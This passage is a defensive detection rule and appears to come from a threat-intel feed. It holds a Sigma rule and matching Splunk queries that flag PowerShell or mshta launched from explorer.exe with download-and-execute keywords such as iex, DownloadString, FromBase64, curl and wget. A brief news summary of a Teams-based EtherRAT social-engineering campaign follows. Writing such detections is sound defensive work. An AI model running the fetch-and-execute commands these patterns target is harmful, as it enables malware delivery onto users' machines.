    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - IT-driven scripted automation that admins paste-launch
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Fake IT support calls on Microsoft Teams push EtherRAT malware

BleepingComputer
2026-07-06 13 use cases 5 techniques 5 kill-chain phases detected

Threat actors are abusing Microsoft Teams voice calls by impersonating corporate IT support staff to trick employees into installing the EtherRAT malware, giving attackers initial access to corporate networks. [...]
